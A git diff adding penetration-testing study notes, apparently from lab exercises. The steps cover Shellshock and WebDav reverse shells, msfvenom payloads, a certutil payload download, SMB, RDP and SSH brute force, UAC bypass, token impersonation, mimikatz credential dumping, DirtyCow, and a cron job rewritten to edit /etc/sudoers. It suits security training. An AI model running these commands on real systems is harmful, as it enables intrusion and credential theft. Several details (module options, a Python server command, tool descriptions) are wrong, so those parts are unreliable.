@@ -1517,7 +1517,7 @@ nmap -sV target-ip --script=http-shellshock --script-args "http-shellshock.uri=/
 # Open web applications analysis -> burpsuite from your Kali Linux
 # Click on "Proxy" and "Intercept is on" from the Burpsuit GUI
 # Click on "Intercept" from the Burpsuit GUI
-nc -nvlip 1234  # On your bash set Netcat to listen on a particular port to create a reverse shell with the target
+nc -nlvp 1234  # On your bash set Netcat to listen on a particular port to create a reverse shell with the target
 # Click on "Repeater" and replace the User-Agent with () { :; }; echo; echo; /bin/bash -c 'bash -i>&/dev/tcp/your-ip/1234 0>&1'  # Create a reverse shell
 # Click on "Send"
 ```
@@ -1530,7 +1530,7 @@ Now on your NetCat bash console you can execute commands directly on the target!
 # start postgresql and msfconsole
 search shellshock  # Search for the Auxiliary module to see if the target is vulnerable
 # use the auxiliary/scanner/http/apache_mod_cgi_bash_env, set params and run it. If target is vulnerable continue
-use exploit/multi/http/cups_bash_env_exec  # Use the Exploit module for ShellShock
+use multi/http/apache_mod_cgi_bash_env_exec # Use the Exploit module for ShellShock
 set RHOSTS target-ip  # Set the target-ip
 set TARGETURI target-cgi.cgi  # Set the target cgi that you have found in the previous method
 exploit  # Run the exploit
@@ -1780,3 +1780,698 @@ hydra -l root -P /usr/share/seclists/Passwords/xato-net-10-million-passwords.txt
 ```
 
 In this example, Hydra managed to find that the password on the SSH is still vulnerable, so we can report it and proceed increasing its complexity or trying to change some ssh configurations on our system.
+
+
+## Host & Network Penetration Testing: System/Host Based Attacks
+
+### Introduction to System/Host Based Attacks
+
+System/Host based attacks are attacks that targets a system or host that is using an OS (like Windows or Linux).
+<br>
+These attacks usually come after you have gained access to the target network, then you can move to exploit target serves or devices.
+<br>
+These attacks are focused on finding and exploiting OS vulnerabilities.
+
+
+### Exploiting WebDav with Metasploit framework
+
+We'll see how to exploit WebDav using Metasploit framework, generating a new shell and doing a reverse-shell to gain access to our WebDav target.
+
+```bash
+nmap -sV -p 80 --script=http-enum target-ip  # We found that it is using WebDav, now we run this command to gain more info
+# In this case we already have the credentials, if not we can try to brute-force them (check the other WebDav Section)
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=target-ip LPORT=your-port -f asp > shell.asp  # Generate an asp shell that you can upload on the target WebDav
+cadaver http://target-ip/webdav  # Use Cadaver to login in and upload our shell
+# Write username and password
+put path-of-your-shell.asp  # Upload the shell.asp in WebDav on Cadaver 
+```
+
+Now we have to set up a listener in order to enable reverse-shell.
+
+```bash
+service postgresql start && msfconsole  # Run postgresql and msfconsole
+use multi/handler  # Use Metasploit framework as a listener for the malicious shell that we have created
+set payload windows/meterpreter/reverse_tcp  # Set the payload the same as what we have used when we created the shell
+set LHOST your-ip  # Set your ip for listening
+set LPORT your-port  # Set the port we have used for our shell
+run  # Run the listener for the reverse shell
+```
+
+Now we can open the browser and navigate to the /webdav endpoint of our target server.
+<br>
+We will click on the shell.asp that we have uploaded in order to enable the reverse shell.
+<br>
+Now on our msfconsole listener we will be able to execute commands directly on the target server with our shell!
+
+
+#### Use a Metasploit framework module to automate this whole process
+
+```bash
+service postgresql start && msfconsole  # Run postgresql and msfconsole
+search iis upload  # Search for the module that will enable uploads on the target WebDav
+use exploit/windows/iis/iis_webdav_upload_asp  # Use the module to upload .asp shell
+set LHOST target-ip  # Set your ip for listening
+set LPORT our-port  # Set the port we have used for our shell
+set HttpUsername target-username  # Set the username (that you got with brute-force for example)
+set HttpPassword target-password  # Set the password (that you got with brute-force for example)
+set RHOSTS target-ip  # Set the target ip
+set PATH /webdav/shell.asp  # Set the endpoint of the WebDav and the name of your shell
+exploit  # Start the exploit
+```
+
+If successful, a meterpreter command will appear and you'll be able to write commands on the target server directly!
+
+
+### Exploiting SMB with PsExec
+
+SMB uses two types of authentications: User and Share.
+<br>
+User Authentication is via username and password, to access a share, while the Share Authentication is via username and password, to access a restricted share.
+
+![alt text](smb_authentication.jpg "SMB Authentication")
+
+PsExec is a tool developed by Microsoft, that allows the execution of commands on remote Windows using credentials.
+<br>
+It's authentication is performed using SMB.
+<br>
+We will use PsExec utility to authenticate on target system and execute commands or launch a remote command prompt.
+<br>
+Before using PsExec we'll have to identify legitimate user accounts (generally the administrator account) and passwords (or hashed passwords): the most common way to do so is by a brute-force login attack on SMB.
+
+```bash
+nmap -sV -sC target-ip  # Perform a port scan to detect the version too
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+search smb_login  # Search a brute-force module for SMB login
+use auxiliary/scanner/smb/smb_login  # Use the brute-force module for SMB
+set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt   # Set the file for username to perform brute-force
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Set the file for and password to perform brute-force
+set RHOSTS target-ip  # Set target ip 
+set VERBOSE false  # Just show the successful login
+run  # Execute the brute-force attack
+```
+
+If successful we will have a set of credentials that we can use with PsExec.
+
+```bash
+psexec.py target-username@target-ip command  # Execute PsExec on another terminal, with the username you found and the command we want to use (for example cmd.exe to execute a remote shell)
+```
+
+It will ask for the password, then if successful you'll be able to execute commands.
+
+#### Perform SMB Exploit with Metasploit framework
+
+You can obtain the same results using Metasploit framework:
+
+```bash
+# on Metasploit
+search psexec  # Search for PsExec exploit modules
+use exploit/windows/smb/psexec  # Use the exploit module
+set RHOSTS target-ip  # Set target ip
+set SMBUser target-username  # Set the target username
+set SMBPass target-password  # Set the target password
+exploit  # Perform the exploit
+```
+
+If successful, you will have a meterpreter shell on the target, where you can execute commands.
+
+
+### Exploiting RDP
+
+The Remote Desktop Protocol (RDP) is a GUI remote protocol developed by Microsoft, used to connect and interact with a Microsoft system.
+<br>
+RDP uses 3389 port as default and it requires valid credentials to access.
+
+```bash
+nmap -sV target-ip  # Perform a port scan on the target ip
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+search rdp_scanner  # Search for the Auxiliary module to check if there is an RDP port on the target
+use auxiliary/scanner/rdp/rdp_scanner  # Use the module
+set RHOSTS target-ip  # Set the target ip
+set RPORT 3333  # Set the target port (in this example it's 3333 as we have seen in the nmap scan)
+run  # Execute the module
+```
+
+We have seen that our target is vulnerable to rdp exploit.
+<br>
+We will perform a brute-force attack to gain valid credentials.
+
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://target-ip -s 3333  # Perform a brute-force attack to gain the credentials on the target and on port 3333 (for this example, else this isn't required if the port is the default 3389)
+xfreerdp /u:target-username /p:target-password /v:target-ip:target-port  # Use xfreerdp to connect on RDP with the credentials we have found
+```
+
+If successful, this will open a Windows GUI of the target interface and we can execute commands or explore it!
+
+
+### Exploiting WinRM 
+
+Windows Remote Managment (WinRM) is a remote protocol that can facilitate the access of Windows systems over HTTP(s).
+<br>
+It is used to remotely access to Windows hosts on local network or executing commands remotely or manage and configure Windows remotely.
+<br>
+It typically runs on ports 5985 or 5986 (but it must be configured since its not a protocol that is used on default).
+<br>
+WinRM uses various forms of authentication. We can use a tool called Crackmapexec to perform a brute-force in order to try to gain credentials.
+<br>
+We can also use a Ruby script called "evil-winrm" to obtain a command shell session on the target.
+
+```bash
+nmap -sV -p 5985 target-ip  # Perform a port scan version with Nmap on the port 5985
+crackmapexec  winrm target-ip -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt  # Run crackmapexec on the target in order to gain administrator credentials
+```
+
+With crackmapexec, if successful you will get the administrator credentials. 
+<br>
+Now you can execute crackmapexec to run commands on the target system.
+
+```bash
+nmap -sV -p 5985 target-ip  # Perform a port scan version with Nmap on the port 5985
+crackmapexec  winrm target-ip -u administrator -p target-password -x "command"  # Execute the command after specifying valid administrator credentials
+```
+
+Now you can execute commands on the target system with administrator privileges!
+
+#### Use evil-winrm
+
+We can also use the Ruby evil-winrm script in order to gain a shell.
+
+```bash
+evil-winrm.rb -u administrator -p 'target-password' -i target-ip  # Use evil-winrm specifying credentials and target ip
+```
+
+Now you will have a shell on the target system!
+
+#### Use Metasploit framework
+
+We can also use Metasploit framework.
+
+```bash
+service postgresql start && msfconsole  # Run postgresql and Metasploit framework
+search winrm_script  # Search for winrm exploit module
+use exploit/windows/winrm/winrm_script_exec  # Use the Exploit module
+set RHOSTS target-ip  # Set target ip
+set FORCE_VBS true  # Force the command to use a VBS script 
+set USERNAME target-username  # Set the target username (administrator)
+set PASSWORD target-password  # Set the target password 
+exploit  # Start the Exploit
+```
+
+If successful you will have a meterpreter shell where you can execute commands!
+
+
+## Windows Privilege Escalation
+
+### Windows Kernel Exploits
+
+Escalation privileges is the process to exploit a vulnerability on a target and elevate privileges of an user.
+<br>
+The Kernel is a computer program that is the core of an operating system and has complete access to resources and hardware of a system.
+<br>
+Windows NT is a kernel that is used on Windows and has the User and Kernel mode (first one has limited privileges, while the second one has full access).
+<br>
+Privilege Escalation on Windows will usually follow this guidelines:
+<li>Identify kernel vulnerabilities</li>
+<li>Downloading, compiling and transfering kernel exploits to the target system</li>
+<br>
+Some of the tools used are:
+<li>Windows-Exploit-Suggester (github)</li>
+<li>Windows-Kernel-Exploits (github)</li>
+
+```bash
+service postgresql start && msfconsole  # Run postgresql and Metasploit framework
+# Find vulnerabilities on the target
+sessions  # Watch the active sessions
+session meterpreter x64/windows  # Use the session with the meterpreter
+getuid  # Watch the privileges of that session
+```
+
+In this example we haven't elevated privileges. So we can use an exploit module with Metasploit framework.
+
+```bash
+search suggester  # Search the exploit module
+use post/multi/recon/local_exploit_suggester  # Use the module
+run  # Execute the module
+```
+
+After this you can see all the exploit modules that you can use for Kernel vulnerabilities.
+<br>
+We'll try to use a module.
+
+```bash
+use exploit/windows/local/ms16_014_wmi_recv_notif  # Use an exploit module
+set SESSION session-number  # Set the session of the Kernel (check your sessions)
+set LPORT port-number  # Set the port number (check your sessions)
+exploit  # Start the Exploit
+```
+
+If successful, you will receive a metepreter shell with elevated privileges!
+
+#### Use Windows-Exploit-Suggester
+
+You can use the Windows-Exploit-Suggester on Github, cloning the repo and starting it.
+
+```bash
+./windows-exploit-suggester.py --database 2021-12-26-mssb.xls --systeminfo ~/Desktop/win7.txt  # Use the Windows Exploit Suggester
+```
+
+#### Use Windows-Kernel-Exploits
+
+After you have seen the list of vulnerabilities with the previous code, you can search for a particular vulnerability on this Windows-Kernel-Exploits on GitHub.
+<br>
+After you have found the vulnerability you can just download the .exe file and transfer it on the target system in order to use it.
+
+```bash
+# return to the meterpreter shell on msfconsole
+cd C:\\  # Move to C folder
+cd Temp:\\  # Move to the Temp folder
+upload your-folder/your-file.exe  # Upload the .exe file you have got from the github repo, specifying the folder/path where you saved the .exe file
+shell  # Use the shell on the Temp folder
+.\your-file.exe  # Execute your .exe file that you have just uploaded
+```
+
+Now it will start a new shell, this time with high privileges!
+
+
+### Bypassing UAC with UACMe
+
+User Account Control is a Windows security measure to prevent unauthorized access on the operating system.
+<br>
+It works so that changes to the OS require the approvation of the administrator of the system (or administrator privileges). A prompt will appear asking for administrator credentials or for approving the request.
+<br>
+There are different tools that you can use for bypassing UAC, for example:
+<li>UACMe (github): open-source privileges escalator tool. It will load a malicious payload that will elevate your Windows privileges.</li>
+
+```bash
+nmap target-ip  # Perform a scan on the target ip
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+setg RHOSTS target-ip  # Set the target ip as a global variable
+search rejetto  # Search rejetto, a framework that is used by UAC
+use exploit/windows/http/rejetto_hfs_exec  # Use the module
+exploit  # Start the exploit
+```
+
+If successful, you will have a meterpreter shell were you can execute Windows commands!
+
+```bash
+pgrep explorer  # Search the port of the explorer to create your own meterpreter session
+migrate explorer-port  # Make migration to that port
+getuid  # Get your account
+getprivs  # Get your privileges 
+shell  # Start a Shell session
+net localgroup administrators  # Get the groups of the administrators
+```
+
+Now you can perform privileges escalation!
+
+#### Using UACMe 
+
+You can use the github tool (UACMe) for this Windows privileges escalation, but first we'll use Msfvenom to generate the payload we need to upload in the target system and make the upload possible.
+
+```bash
+msfvenom -p windows/meterpreter/reverse_tcp LHOSTS=your-ip LPORT=1234 -f exe > backdoor.exe  # Create a payload called backdoor.exe
+# start postgresql and Metasploit framework
+use multi/handler  # Use the module to upload your payload
+set payload windows/meterpreter/reverse_tcp  # Set the payload we have to upload
+set LHOST your-ip  # Set your ip
+set LPORT 1234  # Set the port you have used when creating the payload
+run  # Start to enable to upload
+```
+
+Now we have to clone the UACMe repo, get the file .exe, return to the meterpreter session we had and upload the payload and the .exe file 
+
+```bash
+# Clone the UACMe repository from GitHub and find the correct .exe file you need (in this example Akigi64.exe
+cd C:\\  # Move to the C folder in your meterpreter session on the target system
+mkdir Temp  # Create a Temp folder (were we'll upload the payload and .exe file)
+cd Temp  # Move to the Temp folder
+upload backdoor.exe  # Upload the payload we've created before
+upload /root/Desktop/tools/UACME/Akagi64.exe # Upload the UACMe file (specifying the correct path)
+shell  # Use the Shell
+.\Akagi64.exe 23 C:\Temp\backdoor.exe  # Execute the UACMe exe in order to use the payload with elevated privileges
+```
+
+Now you'll have elevated privileges and you can execute commands!
+
+
+### Access Token Impersonation
+
+Access Token are a core in the Windows authentication and are managed by the Local Security Authority Subsystem Service (LSASS)
+<br>
+The Access Token is used to identify and describe the security context of a process running on the system.
+<br>
+Access Tokens are generated by winlogon.exe everytime an user authenticates and includes the identity and privileges of the user account associated with the process.
+<br>
+To put it simply, every time you start Windows and you input your credentials, then the winlogon will get the identity and privileges of your account and generate the token. From that moment on, everytime you execute a process or anything on the pc, the access token will determine if you have the grants to execute the process or not.
+<br>
+We will try to exploit and impersonate token with a module called Incognito.
+
+```bash
+nmap target-ip  # Perform a scan on the target ip
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+setg RHOSTS target-ip  # Set the target ip as a global variable
+search rejetto  # Search rejetto, a framework that is used by UAC
+use exploit/windows/http/rejetto_hfs_exec  # Use the module
+exploit  # Start the exploit
+```
+
+If successful, you will have a meterpreter shell were you can execute Windows commands!
+
+```bash
+pgrep explorer  # Search the port of the explorer to create your own meterpreter session
+migrate explorer-port  # Make migration to that port
+getuid  # Get your account
+getprivs  # Get your privileges 
+load incognito  # Load the Incognito module
+exploit  # Perform another exploit
+load incognito  # Load the Incognito module again
+list_tokens -u  # List your tokens
+```
+
+You will see your tokens, and you can try to impersonate one:
+
+```bash
+impersonate_token "ATTACKDEFENSE\Administrator"  # Impersonate the token you want
+pgrep explorer  # Search the port of the explorer to create your own meterpreter session
+migrate explorer-port  # Make migration to that port
+getuid  # Get your account
+getprivs  # Get your privileges: now you will have administrator priviliges!
+```
+
+Now you will have impersonated another token and you may have got elevated privileges!
+
+
+## Windows File System Vulnerabilities
+
+### Alternate Data Streams
+
+Alternate Data Streams (ADS) is a NTFS file attribute that was designed to create compatibility with the MacOS HFS (Hierarchical File System).
+<br>
+Any file created on a NTFS formatted drive will have two streams: data stream and resource stream. The data stream is the content of the file (like the text in a text file or audio in audio file) and the resource stream is the information of the file (like when is created, by whom, the dimensions, ecc).
+<br>
+Attackers can use ADS to hide malicious code in files in order to avoid detection.
+
+```bash
+# on Windows
+notepad text.txt:secret.txt  # Create a "secret" file 
+```
+
+After this command the notepad will be open and you can write/edit the secret.txt file. 
+<br>
+When you save, you will only see the text.txt file, empty!
+<br>
+If you want to edit/access that hidden file you have to use notepad text.txt:secret.txt again.
+
+```bash
+# on Windows
+type file.exe > otherfile.txt:file.exe  # Hide a file "behind" a text file
+```
+
+With this command you can hide a file behind another one (generally a text file). 
+<br>
+Note that the file won't be moved or deleted automatically, but you will see that if you access the otherfile.txt:file.exe you can use the hidden file!
+
+```bash
+# on Windows, with administrator privileges
+mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe  # Create an hidden link to the file
+```
+
+This time you have created an hidden link and when you execute the file (in this case with command wupdate), the hidden file will be executed instead!
+
+
+## Windows Credential Dumping
+
+### Windows Password Hashes
+
+The Windows OS stores the account password locally in the SAM (Security Accounts Manager): a databases that stores the hashed password and the authentication and validation of the credentials is facilitated by the Local Security Authority (LSA).
+<br>
+LM (LanMan) is an hashing algorithm:
+<li>Password is converted into seven-character chunk</li>
+<li>All characters are converted in uppercase</li>
+<li>Every chunk is then hashed with the DES algorithm</li>
+
+However, LM hashing is considered a weak algorithm since it's vulnerable to brute-force.
+<br>
+NTLM (NTHash) algorithm is a collection of authenticate protocols.
+<br>
+NTLM encrypts the user account with the MD4 algorithm.
+<br>
+NTLM is much stronger that LM and it's used on Windows from Windows Vista onwards. However both LM and NTLM are stored in the SAM database and thus can be vulnerable.
+
+
+### Searching for Passwords in Windows Configuration Files
+
+Windows as an utility called Unattended Windows Setup Utility that is used to mass-configure Windows on different systems. This utilty, if left after the installation, can become vulnerable since it stores the administrator credentials too.
+<br>
+Usually this utility files are stored in the C:\\Windows\Panther\Unattended.xml or Autonattend.xml
+<br>
+In our example lab we have access to a target Windows Server.
+<br>
+Upload the payload: you have two ways (maybe the python module isn't used anymore..)
+<br>
+Upload manually from the target system.
+
+```bash
+# on your kali linux system
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=your-ip LPORT=1234 -f exe > payload.exe  # Create a payload called payload.exe
+python -m HTTPServer 80  # Create a Python server on port 80
+# on the windows target system
+certutil -urlcache -f http://your-ip/payload.exe > payload.exe  # Download the payload on the target
+```
+
+Upload with Metasploit framework.
+
+```bash
+# on your kali linux system
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=your-ip LPORT=1234 -f exe > payload.exe  # Create a payload called payload.exe
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+use multi/handler  # Use the multi handler module
+set payload windows/x64/meterpreter/reverse_tcp  # Set the payload
+set LPORT 1234  # Set the port of your payload
+set LHOST your-ip  # Set your ip
+run  # Upload the payload to the target
+```
+
+Now you'll have a meterpreter session and you can search for Unattend.xml file.
+
+```bash
+# On the meterpreter session
+search -f Unattend.xml  # Search for the file
+cd C:\\
+cd Windows
+cd Panther
+download Unattend.xml  # Move to the C:\\Windows\Panther and Download the Unattend.xml file
+cat Unattend.xml  # Open the file and see its content and stored hashed administrator password!
+vim password.txt  # Create a new file and save the hashed password
+base64 -d password.txt  # Use the tool to decode the password
+```
+
+Now you can try to execute other programs with administrator credentials! Here's an example on how you can continue:
+
+```bash
+psexec.py Administrator@your-ip  # Execute the psexec tool with administrator credentials
+# write the password
+```
+
+Now you have full access of the target system!
+
+
+### Dumping Hashes with Mimikatz and Kiwi
+
+Mimikatz is a Windows post-exploitation tool used to extract clear-text passwords, hashes and Kerberos from tickets.
+<br>
+We can use the pre-compiled Mimikatz tool or if we have to access a meterpreter session on a Windows target system we can use Kiwi.
+
+```bash
+nmap -sV target-ip  # Perform a port scan and service version with Nmap
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+search badblue  # In the port scan we saw that on port 80 there is a BadBlue service, we'll search for a module for it
+use exploit/windows/http/badblue_passthru  # Use this module 
+set RHOSTS target-ip  # Set the target ip
+exploit  # Run the exploit
+```
+
+This will create a meterpreter session on the target.
+
+```bash
+pgrep lsass  # Get the ID of he lsass 
+migrate lsass-id  # Migrate to the id that you've just received
+```
+
+Now you'll have administrator privileges.
+
+```bash
+load kiwi  # Load kiwi from meterpreter
+lsa_dump_sam  # Get the admin username and NLTM credentials (hash)
+cd C:\\  
+mkdir Temp
+cd Temp
+upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe  # Upload the mimikatz from Kali 
+shell  # Execute a shell session
+.\mimikatz.exe  # Execute Mimikatz
+lsadump::sam  # Show the hashes stored in the SAM database
+lsadump::secrets  # Show the secrets stored in the SAM database
+sekurlsa::logonpassword  # Show the configured passwords
+```
+
+
+## Exploiting Linux Vulnerabilities
+
+### Exploiting FTP
+
+You can try to exploit FTP by gaining access to credentials.
+
+```bash
+nmap -sV target-ip  # Perform a scan on the target ports
+ls -al /usr/share/nmap/scripts/ | grep ftp-*  # Search all the Nmap scripts about ftp, if you want further scan(s)
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target-ip -t 4 ftp  # Use Hydra to perform brute-force to gain credentials
+ftp target  # Connect to ftp
+# Input credentials
+```
+
+Now you have got the credentials and you can access the target system!
+
+
+### Exploiting SSH
+
+You can try to exploit SSH by gaining access to credentials.
+
+```bash
+hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target-ip -t 4 ssh  # Use Hydra to perform brute-force to gain credentials
+ssh target-username@target-ip  # Connect to ssh with the target username on the target ip
+# Input password
+```
+
+Now you have got the credentials and you can access the target system!
+
+
+### Exploiting Samba
+
+Samba is the Linux version of SMB and it's used to consent file sharing with Windows systems.
+<br>
+Samba isn't preconfigured in Linux, so it's not a service that it's used often.
+<br>
+We will perform a brute-force with Hydra to gain credentials and access to user's shares.
+
+```bash
+nmap -sV target-ip  # Perform a service Version with Nmap
+hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt target-ip smb  # Use Hydra to perform brute-force to gain credentials (in this case we already have the username)
+smbmap -H target-ip -u admin -p target-password  # Use SmbMap to access the shares of the user we have found
+smbclient //target-ip/target-share -U admin  # Use Smbclient to navigate in the target share with the target credentials
+# Write the target password
+```
+
+Now you have access to the user folders (since the credentials we got were administrator)!
+<br>
+You can also use Enum4Linux tool:
+
+```bash
+enum4linux -a -u admin -p target-password target-ip  # Use enum4linux to get an overview of the target system
+```
+
+
+## Linux Privilege Escalation
+
+### Linux Kernel Exploits
+
+Kernel exploits will target Linux vulnerabilities to execute commands to obtain privileged system commands in order to obtain a shell.
+<br>
+Kernel escalation process:
+<li>Identify Kernel vulnerabilities</li>
+<li>Downloading, compiling and transfer kernel exploits into the target system</li>
+
+We will use various tools, for example Linux-Exploit-Suggester (from GitHub).
+
+```bash
+# perform a Linux exploit in order to gain meterpreter shell on the target
+# download linux-exploit-suggester from GitHub
+# on the target shell (via meterpreter)
+upload linux-exploit-suggester-path  # Upload the Linux Exploit Suggester on the target
+shell  # Execute a shell
+chmod +x les.sh  # Make the Linux Exploit Suggester that you have just executed, executable
+./les.sh  # Execute the Linux Exploit Suggester
+```
+
+This tool will give you all the possible exploits on the target, with details and probabilities.
+<br>
+Another tool we'll explore is the DirtyCow (from GitHub).
+
+```bash
+# download the DirtyCow tool from GitHub or exploit-db
+# on meterpreter shell
+upload path-to-dirtycow  # Upload the dirty cow tool in your target system
+sudo apt-get install gcc  # Compiler for C language
+mv 40839.c dirty.c  # Rename the file
+gcc -pthread dirty.c -o dirty -lcrypt  # Execute this command
+./dirty password  # Select a password to use, this command will create a new user with that password (you can also configure username)
+su firefart  # Log in with the new user (use the correct username)
+```
+
+Now you have an account with elevated privileges in your target system!
+
+
+### Exploiting Misconfigured Cron Jobs
+
+Linux implements tasks using Cron. Cron is a time-based service that runs applications and commands repeatedly on specified schedule (cronjob).
+<br>
+Every user can create a cronjob, but these tasks will run with the same privileges of the user that created them.
+<br>
+In the following exercise we already are in the target system but we have an account without privileges. In our folder there is a file with root privileges that we cannot access and it's part of a cronjob.
+<br>
+Will try to find every occurrence of this path
+
+```bash
+grep -rnw /usr -e "/home/student/message"  # Find every occurrence of the path
+cat occurence-path  # See the content of the file that is the occurrence of the file in our folder
+printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh  # Redirect this message into our target cronjob
+```
+
+Now, the next time that cronjob is executed you'll gain elevated privileges because we have modified the cronjob!
+
+
+### Exploiting SUID Binaries
+
+In addition to the standards permissions (read, write, execute), Linux has another privileges called SUID (Set Owner User Id).
+<br>
+SUID allows a non privileged user to access or execute a file with elevated privileges.
+<br>
+We can try to exploit this fact in order to gain permanent elevated privileges.
+<br>
+In this example we have a non-privileges account on the target. In our folder there is a file with a s privilege.
+
+```bash
+string file-with-s-permissions  # List all the files that are executed by the file with the s permission
+rm file  # We have seen there is a file (in this case greetings) that is executed too, we can remove it and replace with another one to gain privileges
+cp /bin/bash file  # Copy the bin/bash into the file so that when it's executed it will give us privileges
+./file-with-s-permission  # Execute this file 
+```
+
+Now we'll have elevated privileges because it will execute our copied bin/bash file that will grant use elevated privileges!
+
+
+### Dumping Linux Hashes Passwords
+
+All the information of the Linux accounts are stored in the /etc/passwd. The passwords are encrypted and store in the "shadow" file in /etc/shadow, visible only by root accounts.
+<br>
+There are different types of password hashes. We can find what type is it looking at the number after the $.
+
+![alt text](linux_password_hashes.jpg "Linux Password Hashes")
+
+```bash
+nmap -sV target-ip  # Perform a port scan on the target
+service postgresql start && msfconsole  # Start postgresql and Metasploit framework
+setg RHOSTS target-ip  # Set the target ip
+searc proftpd  # We have seen that the target has ftp, we can exploit it with this module
+use exploit/unix/ftp/proftp_133c_backdoor  # Use this exploit module
+set payload payload/cmd/unix/reverse  # Set Payload
+set LHOST your-ip  # Set your ip
+exploit  # Execute module
+# Now we have a meterpreter session on the target
+cat /etc/shadow  # Show the content of file shadow
+# Copy the hashed password (check the $ number) and put the session in background
+search hashdump  # Search for the module
+use post/linux/gather/hashdump  # Use this module
+set SESSION 2  # Set the meterpreter session
+run  # Run the module
+```
+
+This will create a password file and we can un-shadow the password (in the following chapters)!
